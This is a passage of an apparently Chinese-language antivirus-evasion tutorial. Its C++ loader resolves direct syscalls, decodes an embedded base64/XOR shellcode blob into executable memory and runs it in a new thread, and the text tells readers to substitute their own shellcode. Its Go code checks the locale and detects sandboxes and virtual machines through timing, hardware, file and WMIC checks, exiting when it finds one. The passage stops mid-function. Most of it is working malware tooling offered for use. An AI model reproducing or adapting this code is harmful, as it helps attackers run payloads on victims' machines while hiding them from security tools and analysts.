        SyscallAddress = SW3_RVA2VA(
            PVOID,
            NtApiAddress,
            distance_to_syscall + num_jumps * <span class="hljs-number">0x20</span>);
        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">memcmp</span>((PVOID)syscall_code, SyscallAddress, <span class="hljs-keyword">sizeof</span>(syscall_code)))
        {
<span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> defined(DEBUG)</span>
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Found Syscall Opcodes at address 0x%p\n&quot;</span>, SyscallAddress);
<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>
            <span class="hljs-keyword">return</span> SyscallAddress;
        }

        <span class="hljs-comment">// let&apos;s try with an Nt* API above our syscall</span>
        SyscallAddress = SW3_RVA2VA(
            PVOID,
            NtApiAddress,
            distance_to_syscall - num_jumps * <span class="hljs-number">0x20</span>);
        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">memcmp</span>((PVOID)syscall_code, SyscallAddress, <span class="hljs-keyword">sizeof</span>(syscall_code)))
        {
<span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> defined(DEBUG)</span>
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Found Syscall Opcodes at address 0x%p\n&quot;</span>, SyscallAddress);
<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>
            <span class="hljs-keyword">return</span> SyscallAddress;
        }
    }

<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> DEBUG</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Syscall Opcodes not found!\n&quot;</span>);
<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>

    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;
}
<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>


<span class="hljs-function">BOOL <span class="hljs-title">SW3_PopulateSyscallList</span><span class="hljs-params">()</span>
</span>{
    <span class="hljs-comment">// Return early if the list is already populated.</span>
    <span class="hljs-keyword">if</span> (SW3_SyscallList.Count) <span class="hljs-keyword">return</span> TRUE;

<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _WIN64</span>
    PSW3_PEB Peb = (PSW3_PEB)__readgsqword(<span class="hljs-number">0x60</span>);
<span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span>
    PSW3_PEB Peb = (PSW3_PEB)__readfsdword(<span class="hljs-number">0x30</span>);
<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>
    PSW3_PEB_LDR_DATA Ldr = Peb-&gt;Ldr;
    PIMAGE_EXPORT_DIRECTORY ExportDirectory = <span class="hljs-literal">NULL</span>;
    PVOID DllBase = <span class="hljs-literal">NULL</span>;

    <span class="hljs-comment">// Get the DllBase address of NTDLL.dll. NTDLL is not guaranteed to be the second</span>
    <span class="hljs-comment">// in the list, so it&apos;s safer to loop through the full list and find it.</span>
    PSW3_LDR_DATA_TABLE_ENTRY LdrEntry;
    <span class="hljs-keyword">for</span> (LdrEntry = (PSW3_LDR_DATA_TABLE_ENTRY)Ldr-&gt;Reserved2[<span class="hljs-number">1</span>]; LdrEntry-&gt;DllBase != <span class="hljs-literal">NULL</span>; LdrEntry = (PSW3_LDR_DATA_TABLE_ENTRY)LdrEntry-&gt;Reserved1[<span class="hljs-number">0</span>])
    {
        DllBase = LdrEntry-&gt;DllBase;
        PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;
        PIMAGE_NT_HEADERS NtHeaders = SW3_RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader-&gt;e_lfanew);
        PIMAGE_DATA_DIRECTORY DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders-&gt;OptionalHeader.DataDirectory;
        DWORD VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        <span class="hljs-keyword">if</span> (VirtualAddress == <span class="hljs-number">0</span>) <span class="hljs-keyword">continue</span>;

        ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)SW3_RVA2VA(ULONG_PTR, DllBase, VirtualAddress);

        <span class="hljs-comment">// If this is NTDLL.dll, exit loop.</span>
        PCHAR DllName = SW3_RVA2VA(PCHAR, DllBase, ExportDirectory-&gt;Name);

        <span class="hljs-keyword">if</span> ((*(ULONG*)DllName | <span class="hljs-number">0x20202020</span>) != <span class="hljs-number">0x6c64746e</span>) <span class="hljs-keyword">continue</span>;
        <span class="hljs-keyword">if</span> ((*(ULONG*)(DllName + <span class="hljs-number">4</span>) | <span class="hljs-number">0x20202020</span>) == <span class="hljs-number">0x6c642e6c</span>) <span class="hljs-keyword">break</span>;
    }

    <span class="hljs-keyword">if</span> (!ExportDirectory) <span class="hljs-keyword">return</span> FALSE;

    DWORD NumberOfNames = ExportDirectory-&gt;NumberOfNames;
    PDWORD Functions = SW3_RVA2VA(PDWORD, DllBase, ExportDirectory-&gt;AddressOfFunctions);
    PDWORD Names = SW3_RVA2VA(PDWORD, DllBase, ExportDirectory-&gt;AddressOfNames);
    PWORD Ordinals = SW3_RVA2VA(PWORD, DllBase, ExportDirectory-&gt;AddressOfNameOrdinals);

    <span class="hljs-comment">// Populate SW3_SyscallList with unsorted Zw* entries.</span>
    DWORD i = <span class="hljs-number">0</span>;
    PSW3_SYSCALL_ENTRY Entries = SW3_SyscallList.Entries;
    <span class="hljs-keyword">do</span>
    {
        PCHAR FunctionName = SW3_RVA2VA(PCHAR, DllBase, Names[NumberOfNames - <span class="hljs-number">1</span>]);

        <span class="hljs-comment">// Is this a system call?</span>
        <span class="hljs-keyword">if</span> (*(USHORT*)FunctionName == <span class="hljs-number">0x775a</span>)
        {
            Entries[i].Hash = SW3_HashSyscall(FunctionName);
            Entries[i].Address = Functions[Ordinals[NumberOfNames - <span class="hljs-number">1</span>]];
            Entries[i].SyscallAddress = SC_Address(SW3_RVA2VA(PVOID, DllBase, Entries[i].Address));

            i++;
            <span class="hljs-keyword">if</span> (i == SW3_MAX_ENTRIES) <span class="hljs-keyword">break</span>;
        }
    } <span class="hljs-keyword">while</span> (--NumberOfNames);

    <span class="hljs-comment">// Save total number of system calls found.</span>
    SW3_SyscallList.Count = i;

    <span class="hljs-comment">// Sort the list by address in ascending order.</span>
    <span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">0</span>; i &lt; SW3_SyscallList.Count - <span class="hljs-number">1</span>; i++)
    {
        <span class="hljs-keyword">for</span> (DWORD j = <span class="hljs-number">0</span>; j &lt; SW3_SyscallList.Count - i - <span class="hljs-number">1</span>; j++)
        {
            <span class="hljs-keyword">if</span> (Entries[j].Address &gt; Entries[j + <span class="hljs-number">1</span>].Address)
            {
                <span class="hljs-comment">// Swap entries.</span>
                SW3_SYSCALL_ENTRY TempEntry;

                TempEntry.Hash = Entries[j].Hash;
                TempEntry.Address = Entries[j].Address;
                TempEntry.SyscallAddress = Entries[j].SyscallAddress;

                Entries[j].Hash = Entries[j + <span class="hljs-number">1</span>].Hash;
                Entries[j].Address = Entries[j + <span class="hljs-number">1</span>].Address;
                Entries[j].SyscallAddress = Entries[j + <span class="hljs-number">1</span>].SyscallAddress;

                Entries[j + <span class="hljs-number">1</span>].Hash = TempEntry.Hash;
                Entries[j + <span class="hljs-number">1</span>].Address = TempEntry.Address;
                Entries[j + <span class="hljs-number">1</span>].SyscallAddress = TempEntry.SyscallAddress;
            }
        }
    }

    <span class="hljs-keyword">return</span> TRUE;
}

<span class="hljs-function">EXTERN_C DWORD <span class="hljs-title">SW3_GetSyscallNumber</span><span class="hljs-params">(DWORD FunctionHash)</span>
</span>{
    <span class="hljs-comment">// Ensure SW3_SyscallList is populated.</span>
    <span class="hljs-keyword">if</span> (!SW3_PopulateSyscallList()) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;

    <span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">0</span>; i &lt; SW3_SyscallList.Count; i++)
    {
        <span class="hljs-keyword">if</span> (FunctionHash == SW3_SyscallList.Entries[i].Hash)
        {
            <span class="hljs-keyword">return</span> i;
        }
    }

    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
}

<span class="hljs-function">EXTERN_C PVOID <span class="hljs-title">SW3_GetSyscallAddress</span><span class="hljs-params">(DWORD FunctionHash)</span>
</span>{
    <span class="hljs-comment">// Ensure SW3_SyscallList is populated.</span>
    <span class="hljs-keyword">if</span> (!SW3_PopulateSyscallList()) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;

    <span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">0</span>; i &lt; SW3_SyscallList.Count; i++)
    {
        <span class="hljs-keyword">if</span> (FunctionHash == SW3_SyscallList.Entries[i].Hash)
        {
            <span class="hljs-keyword">return</span> SW3_SyscallList.Entries[i].SyscallAddress;
        }
    }

    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;
}

<span class="hljs-function">EXTERN_C PVOID <span class="hljs-title">SW3_GetRandomSyscallAddress</span><span class="hljs-params">(DWORD FunctionHash)</span>
</span>{
    <span class="hljs-comment">// Ensure SW3_SyscallList is populated.</span>
    <span class="hljs-keyword">if</span> (!SW3_PopulateSyscallList()) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;

    DWORD index = ((DWORD)rand()) % SW3_SyscallList.Count;

    <span class="hljs-keyword">while</span> (FunctionHash == SW3_SyscallList.Entries[index].Hash) {
        <span class="hljs-comment">// Spoofing the syscall return address</span>
        index = ((DWORD)rand()) % SW3_SyscallList.Count;
    }
    <span class="hljs-keyword">return</span> SW3_SyscallList.Entries[index].SyscallAddress;
}



<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
</span>{
    <span class="hljs-keyword">bool</span> all_tests_passed = <span class="hljs-literal">false</span>;

    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> rest2_reference = <span class="hljs-string">&quot;bfUFBQQA0ICAgIWMvgl/X39zk6MSY6Oj4mMTomOjEIMtZguQ@@&quot;</span>;

    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> rest3_reference = replace(rest2_reference, <span class="hljs-string">&quot;@@&quot;</span>, <span class="hljs-string">&quot;==&quot;</span>);

    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> rest2_decoded = base64_decode(rest3_reference);

    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* S = rest2_decoded.c_str();




    HANDLE hProc = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        <span class="hljs-number">8696</span>
    );

    SYSTEM_INFO sys_inf;
    GetSystemInfo(&amp;sys_inf);

    DWORD page_size{ sys_inf.dwPageSize };
    DWORD alloc_gran{ sys_inf.dwAllocationGranularity };

    SIZE_T szVmResv{ alloc_gran };
    SIZE_T szVmCmm{ page_size };
    DWORD  cVmResv = (rest2_decoded.length() / szVmResv) + <span class="hljs-number">1</span>;
    DWORD  cVmCmm = szVmResv / szVmCmm;

    LPVOID vmBaseAddress = GetSuitableBaseAddress(
        hProc,
        szVmCmm,
        szVmResv,
        cVmResv
    );
    LPVOID    currentVmBase{ vmBaseAddress };
    NTSTATUS  status{ <span class="hljs-number">0</span> };
    <span class="hljs-built_in">vector</span>&lt;LPVOID&gt;  vcVmResv;

    <span class="hljs-comment">//alloc memeory</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= cVmResv; ++i)
    {

        status = BNtAVM(
            hProc,
            &amp;currentVmBase,
            <span class="hljs-literal">NULL</span>,
            &amp;szVmResv,
            MEM_RESERVE,
            PAGE_NOACCESS
        );
        <span class="hljs-keyword">if</span> (STATUS_SUCCESS == status) {
            vcVmResv.push_back(currentVmBase);
        }
        <span class="hljs-keyword">else</span> {

            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;AVM error&quot;</span>;
        }
        currentVmBase = (LPVOID)((DWORD_PTR)currentVmBase + szVmResv);
    }

    DWORD           offsetSc{ <span class="hljs-number">0</span> };
    DWORD           oldProt;

    <span class="hljs-keyword">double</span> prcDone{ <span class="hljs-number">0</span> };

    DWORD     cmm_i;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; cVmResv; ++i)
    {
        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>* sc = <span class="hljs-keyword">new</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>[szVmCmm];
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; szVmCmm; j++) {
            <span class="hljs-comment">//cout &lt;&lt; szVmCmm * i + j &lt;&lt; endl;</span>
            sc[j] = S[szVmCmm * i + j] ^ XOR_KEY;
        }

        <span class="hljs-keyword">void</span>* exec = VirtualAlloc(<span class="hljs-number">0</span>, cVmResv, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        <span class="hljs-built_in">memcpy</span>(exec, sc, rest2_decoded.length());


        HANDLE hThread{ <span class="hljs-literal">nullptr</span> };
        ANtCTE(
            &amp;hThread,
            THREAD_ALL_ACCESS,
            <span class="hljs-literal">NULL</span>,
            GetCurrentProcess(),
            (LPTHREAD_START_ROUTINE)exec,
            <span class="hljs-literal">NULL</span>,
            <span class="hljs-literal">NULL</span>,
            <span class="hljs-number">0</span>,
            <span class="hljs-number">0</span>,
            <span class="hljs-number">0</span>,
            <span class="hljs-literal">nullptr</span>
        );
        WaitForSingleObject(hThread, INFINITE);

    }
}
</code></pre>
<p>&#x66FF;&#x6362;rest2_reference&#x5904;&#x7684;shellcode&#x4E3A;&#x81EA;&#x5DF1;&#x7684;</p>
<p>&#x7F16;&#x8BD1;&#x8FD0;&#x884C;...</p>
<h3 id="&#x9AD8;&#x7EA7;&#x7ED5;&#x8FC7;">&#x9AD8;&#x7EA7;&#x7ED5;&#x8FC7;</h3>
<pre><code>&#x53CD;vt
&#x53CD;&#x8C03;&#x8BD5;
&#x53CD;&#x865A;&#x62DF;&#x673A;
</code></pre><pre><code>&#x9759;&#x6001;&#x626B;&#x63CF;&#xFF1A;md5-hash&#x7279;&#x5F81;&#x7801;
&#x52A8;&#x6001;&#x626B;&#x63CF;&#xFF1A;&#x865A;&#x62DF;&#x673A;&#xFF0C;vt&#xFF0C;&#x884C;&#x4E3A;&#x68C0;&#x6D4B;
&#x53CD;&#x7F16;&#x8BD1;&#x8C03;&#x8BD5;&#xFF1A;&#x9006;&#x51FA;&#x6E90;&#x7801;&#x6216;&#x8005;&#x89C2;&#x5BDF;&#x884C;&#x4E3A;
</code></pre><p><a href="https://www.freebuf.com/articles/web/202717.html" target="_blank">https://www.freebuf.com/articles/web/202717.html</a></p>
<h4 id="1-&#x53CD;&#x865A;&#x62DF;&#x673A;">1-&#x53CD;&#x865A;&#x62DF;&#x673A;</h4>
<pre><code>&#x68C0;&#x6D4B;&#x5185;&#x5BB9;&#x53EF;&#x4EE5;&#x770B;&#x5982;&#x4E0A;
</code></pre><h6 id="&#x68C0;&#x6D4B;&#x4EE3;&#x7801;-go">&#x68C0;&#x6D4B;&#x4EE3;&#x7801;-go</h6>
<pre><code class="lang-go"><span class="hljs-keyword">package</span> main

<span class="hljs-keyword">import</span> (
    <span class="hljs-string">&quot;encoding/hex&quot;</span>
    <span class="hljs-string">&quot;golang.org/x/sys/windows&quot;</span>
    <span class="hljs-string">&quot;os&quot;</span>
    <span class="hljs-string">&quot;os/exec&quot;</span>
    <span class="hljs-string">&quot;path/filepath&quot;</span>
    <span class="hljs-string">&quot;runtime&quot;</span>
    <span class="hljs-string">&quot;strings&quot;</span>
    <span class="hljs-string">&quot;syscall&quot;</span>
    <span class="hljs-string">&quot;time&quot;</span>
    <span class="hljs-string">&quot;unsafe&quot;</span>
)

<span class="hljs-comment">// &#x68C0;&#x6D4B;&#x8BED;&#x8A00;&#xFF0C;&#x4F9D;&#x8D56;windows&#x6570;&#x636E;&#x5305;&#xFF0C;&#x7F16;&#x8BD1;&#x540E;&#x4F1A;&#x589E;&#x52A0;0.6M&#x5927;&#x5C0F;</span>
<span class="hljs-keyword">func</span> check_language() {
    a, _ := windows.GetUserPreferredUILanguages(windows.MUI_LANGUAGE_NAME) <span class="hljs-comment">//&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x7CFB;&#x7EDF;&#x9996;&#x9009;&#x8BED;&#x8A00;</span>
    <span class="hljs-keyword">if</span> a[<span class="hljs-number">0</span>] != <span class="hljs-string">&quot;zh-CN&quot;</span> {
        os.Exit(<span class="hljs-number">1</span>)
    }
}

<span class="hljs-keyword">func</span> check_sandbox() {
    <span class="hljs-comment">// 1. &#x5EF6;&#x65F6;&#x8FD0;&#x884C;</span>
    timeSleep1, _ := timeSleep()
    <span class="hljs-comment">// 2. &#x68C0;&#x6D4B;&#x5F00;&#x673A;&#x65F6;&#x95F4;</span>
    bootTime1, _ := bootTime()
    <span class="hljs-comment">// 3. &#x68C0;&#x6D4B;&#x7269;&#x7406;&#x5185;&#x5B58;</span>
    physicalMemory1, _ := physicalMemory()
    <span class="hljs-comment">// 4. &#x68C0;&#x6D4B;CPU&#x6838;&#x5FC3;&#x6570;</span>
    numberOfCPU1, _ := numberOfCPU()
    <span class="hljs-comment">// 5. &#x68C0;&#x6D4B;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x6570;</span>
    numberOfTempFiles1, _ := numberOfTempFiles()
    level := timeSleep1 + bootTime1 + physicalMemory1 + numberOfCPU1 + numberOfTempFiles1 <span class="hljs-comment">// &#x6709;&#x4E94;&#x4E2A;&#x7B49;&#x7EA7;&#xFF0C;&#x7B49;&#x7EA7;&#x8D8A;&#x8D8B;&#x5411;&#x4E8E;5&#xFF0C;&#x8D8A;&#x50CF;&#x771F;&#x673A;</span>
    <span class="hljs-comment">//fmt.Println(&quot;level:&quot;, level)</span>
    <span class="hljs-keyword">if</span> level &lt; <span class="hljs-number">4</span> {
        os.Exit(<span class="hljs-number">1</span>)
    }
}

<span class="hljs-comment">// 1. &#x5EF6;&#x65F6;&#x8FD0;&#x884C;</span>
<span class="hljs-keyword">func</span> timeSleep() (<span class="hljs-keyword">int</span>, error) {
    startTime := time.Now()
    time.Sleep(<span class="hljs-number">5</span> * time.Second)
    endTime := time.Now()
    sleepTime := endTime.Sub(startTime)
    <span class="hljs-keyword">if</span> sleepTime &gt;= time.Duration(<span class="hljs-number">5</span>*time.Second) {
        <span class="hljs-comment">//fmt.Println(&quot;&#x7761;&#x7720;&#x65F6;&#x95F4;&#x4E3A;:&quot;, sleepTime)</span>
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>, <span class="hljs-literal">nil</span>
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>, <span class="hljs-literal">nil</span>
    }
}

<span class="hljs-comment">// 2. &#x68C0;&#x6D4B;&#x5F00;&#x673A;&#x65F6;&#x95F4;</span>
<span class="hljs-comment">// &#x8BB8;&#x591A;&#x6C99;&#x7BB1;&#x68C0;&#x6D4B;&#x5B8C;&#x6BD5;&#x540E;&#x4F1A;&#x91CD;&#x7F6E;&#x7CFB;&#x7EDF;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x68C0;&#x6D4B;&#x5F00;&#x673A;&#x65F6;&#x95F4;&#x6765;&#x5224;&#x65AD;&#x662F;&#x5426;&#x4E3A;&#x771F;&#x5B9E;&#x7684;&#x8FD0;&#x884C;&#x72B6;&#x51B5;&#x3002;</span>
<span class="hljs-keyword">func</span> bootTime() (<span class="hljs-keyword">int</span>, error) {
    <span class="hljs-keyword">var</span> kernel = syscall.NewLazyDLL(<span class="hljs-string">&quot;Kernel32.dll&quot;</span>)
    GetTickCount := kernel.NewProc(<span class="hljs-string">&quot;GetTickCount&quot;</span>)
    r, _, _ := GetTickCount.Call()
    <span class="hljs-keyword">if</span> r == <span class="hljs-number">0</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>, <span class="hljs-literal">nil</span>
    }
    ms := time.Duration(r * <span class="hljs-number">1000</span> * <span class="hljs-number">1000</span>)
    tm := time.Duration(<span class="hljs-number">30</span> * time.Minute)
    <span class="hljs-comment">//fmt.Println(ms,tm)</span>
    <span class="hljs-keyword">if</span> ms &lt; tm {
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>, <span class="hljs-literal">nil</span>
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>, <span class="hljs-literal">nil</span>
    }

}

<span class="hljs-comment">// 3&#x3001;&#x7269;&#x7406;&#x5185;&#x5B58;&#x5927;&#x5C0F;</span>
<span class="hljs-keyword">func</span> physicalMemory() (<span class="hljs-keyword">int</span>, error) {
    <span class="hljs-keyword">var</span> mod = syscall.NewLazyDLL(<span class="hljs-string">&quot;kernel32.dll&quot;</span>)
    <span class="hljs-keyword">var</span> proc = mod.NewProc(<span class="hljs-string">&quot;GetPhysicallyInstalledSystemMemory&quot;</span>)
    <span class="hljs-keyword">var</span> mem <span class="hljs-keyword">uint64</span>
    proc.Call(<span class="hljs-keyword">uintptr</span>(unsafe.Pointer(&amp;mem)))
    mem = mem / <span class="hljs-number">1048576</span>
    <span class="hljs-comment">//fmt.Printf(&quot;&#x7269;&#x7406;&#x5185;&#x5B58;&#x4E3A;%dG\n&quot;, mem)</span>
    <span class="hljs-keyword">if</span> mem &lt; <span class="hljs-number">4</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>, <span class="hljs-literal">nil</span> <span class="hljs-comment">// &#x5C0F;&#x4E8E;4GB&#x8FD4;&#x56DE;0</span>
    }
    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>, <span class="hljs-literal">nil</span> <span class="hljs-comment">// &#x5927;&#x4E8E;4GB&#x8FD4;&#x56DE;1</span>
}

<span class="hljs-keyword">func</span> numberOfCPU() (<span class="hljs-keyword">int</span>, error) {
    a := runtime.NumCPU()
    <span class="hljs-comment">//fmt.Println(&quot;CPU&#x6838;&#x5FC3;&#x6570;&#x4E3A;:&quot;, a)</span>
    <span class="hljs-keyword">if</span> a &lt; <span class="hljs-number">4</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>, <span class="hljs-literal">nil</span> <span class="hljs-comment">// &#x5C0F;&#x4E8E;4&#x6838;&#x5FC3;&#x6570;,&#x8FD4;&#x56DE;0</span>
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>, <span class="hljs-literal">nil</span> <span class="hljs-comment">// &#x5927;&#x4E8E;4&#x6838;&#x5FC3;&#x6570;&#xFF0C;&#x8FD4;&#x56DE;1</span>
    }
}
<span class="hljs-keyword">func</span> numberOfTempFiles() (<span class="hljs-keyword">int</span>, error) {
    conn := os.Getenv(<span class="hljs-string">&quot;temp&quot;</span>) <span class="hljs-comment">// &#x901A;&#x8FC7;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x8BFB;&#x53D6;temp&#x6587;&#x4EF6;&#x5939;&#x8DEF;&#x5F84;</span>
    <span class="hljs-keyword">var</span> k <span class="hljs-keyword">int</span>
    <span class="hljs-keyword">if</span> conn == <span class="hljs-string">&quot;&quot;</span> {
        <span class="hljs-comment">//fmt.Println(&quot;&#x672A;&#x627E;&#x5230;temp&#x6587;&#x4EF6;&#x5939;&#xFF0C;&#x6216;temp&#x6587;&#x4EF6;&#x5939;&#x4E0D;&#x5B58;&#x5728;&quot;)</span>
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>, <span class="hljs-literal">nil</span>
    } <span class="hljs-keyword">else</span> {
        local_dir := conn
        err := filepath.Walk(local_dir, <span class="hljs-keyword">func</span>(filename <span class="hljs-keyword">string</span>, fi os.FileInfo, err error) error {
            <span class="hljs-keyword">if</span> fi.IsDir() {
                <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
            }
            k++
            <span class="hljs-comment">// fmt.Println(&quot;filename:&quot;, filename)  // &#x8F93;&#x51FA;&#x6587;&#x4EF6;&#x540D;&#x5B57;</span>
            <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
        })
        <span class="hljs-comment">//fmt.Println(&quot;Temp&#x603B;&#x5171;&#x6587;&#x4EF6;&#x6570;&#x91CF;:&quot;, k)</span>
        <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
            <span class="hljs-comment">// fmt.Println(&quot;&#x8DEF;&#x5F84;&#x83B7;&#x53D6;&#x9519;&#x8BEF;&quot;)</span>
            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>, <span class="hljs-literal">nil</span>
        }
    }
    <span class="hljs-keyword">if</span> k &lt; <span class="hljs-number">30</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>, <span class="hljs-literal">nil</span>
    }
    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>, <span class="hljs-literal">nil</span>
}

<span class="hljs-keyword">func</span> check_virtual() (<span class="hljs-keyword">bool</span>, error) { <span class="hljs-comment">// &#x8BC6;&#x522B;&#x865A;&#x62DF;&#x673A;</span>
    model := <span class="hljs-string">&quot;&quot;</span>
    <span class="hljs-keyword">var</span> cmd *exec.Cmd
    cmd = exec.Command(<span class="hljs-string">&quot;cmd&quot;</span>, <span class="hljs-string">&quot;/C&quot;</span>, <span class="hljs-string">&quot;wmic path Win32_ComputerSystem get Model&quot;</span>)
    stdout, err := cmd.Output()
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>, err
    }
    model = strings.ToLower(<span class="hljs-keyword">string</span>(stdout))
    <span class="hljs-keyword">if</span> strings.Contains(model, <span class="hljs-string">&quot;VirtualBox&quot;</span>) || strings.Contains(model, <span class="hljs-string">&quot;virtual&quot;</span>) || strings.Contains(model, <span class="hljs-string">&quot;VMware&quot;</span>) ||
        strings.Contains(model, <span class="hljs-string">&quot;KVM&quot;</span>) || strings.Contains(model, <span class="hljs-string">&quot;Bochs&quot;</span>) || strings.Contains(model, <span class="hljs-string">&quot;HVM domU&quot;</span>) || strings.Contains(model, <span class="hljs-string">&quot;Parallels&quot;</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>, <span class="hljs-literal">nil</span> <span class="hljs-comment">//&#x5982;&#x679C;&#x662F;&#x865A;&#x62DF;&#x673A;&#x5219;&#x8FD4;&#x56DE;true</span>
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>, <span class="hljs-literal">nil</span>
}
<span class="hljs-keyword">func</span> PathExists(path <span class="hljs-keyword">string</span>) (<span class="hljs-keyword">bool</span>, error) {
    _, err := os.Stat(path)
    <span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>, <span class="hljs-literal">nil</span>
    }
    <span class="hljs-keyword">if</span> os.IsNotExist(err) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>, <span class="hljs-literal">nil</span>
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>, err
}
<span class="hljs-keyword">func</span> fack(path <span class="hljs-keyword">string</span>) {
    b, _ := PathExists(path)
    <span class="hljs-keyword">if</span> b {
        os.Exit(<span class="hljs-number">1</span>)
    }
}
<span class="hljs-keyword">func</span> check_file() {
    fack(<span class="hljs-string">&quot;C:\\windows\\System32\\Drivers\\Vmmouse.sys&quot;</span>)
    fack(<span class="hljs-string">&quot;C:\\windows\\System32\\Drivers\\vmtray.dll&quot;</span>)
    fack(<span class="hljs-string">&quot;C:\\windows\\System32\\Drivers\\VMToolsHook.dll&quot;</span>)
    fack(<span class="hljs-string">&quot;C:\\windows\\System32\\Drivers\\vmmousever.dll&quot;</span>)
    fack(<span class="hljs-string">&quot;C:\\windows\\System32\\Drivers\\vmhgfs.dll&quot;</span>)
    fack(<span class="hljs-string">&quot;C:\\windows\\System32\\Drivers\\vmGuestLib.dll&quot;</span>)
    fack(<span class="hljs-string">&quot;C:\\windows\\System32\\Drivers\\VBoxMouse.sys&quot;</span>)
    fack(<span class="hljs-string">&quot;C:\\windows\\System32\\Drivers\\VBoxGuest.sys&quot;</span>)
    fack(<span class="hljs-string">&quot;C:\\windows\\System32\\Drivers\\VBoxSF.sys&quot;</span>)
    fack(<span class="hljs-string">&quot;C:\\windows\\System32\\Drivers\\VBoxVideo.sys&quot;</span>)
    fack(<span class="hljs-string">&quot;C:\\windows\\System32\\vboxdisp.dll&quot;</span>)
    fack(<span class="hljs-string">&quot;C:\\windows\\System32\\vboxhook.dll&quot;</span>)
    fack(<span class="hljs-string">&quot;C:\\windows\\System32\\vboxoglerrorspu.dll&quot;</span>)
    fack(<span class="hljs-string">&quot;C:\\windows\\System32\\vboxoglpassthroughspu.dll&quot;</span>)
    fack(<span class="hljs-string">&quot;C:\\windows\\System32\\vboxservice.exe&quot;</span>)
    fack(<span class="hljs-string">&quot;C:\\windows\\System32\\vboxtray.exe&quot;</span>)
    fack(<span class="hljs-string">&quot;C:\\windows\\System32\\VBoxControl.exe&quot;</span>)
}

<span class="hljs-keyword">var</span> VirtualAlloc = syscall.NewLazyDLL(<span class="hljs-string">&quot;kernel32.dll&quot;</span>).NewProc(<span class="hljs-string">&quot;VirtualProtect&quot;</span>)

<span class="hljs-keyword">func</span> aaa(a unsafe.Pointer, b <span class="hljs-keyword">uintptr</span>, c <span class="hljs-keyword">uint32</span>, d unsafe.Pointer) <span class="hljs-keyword">bool</span> {
    ret, _, _ := VirtualAlloc.Call(
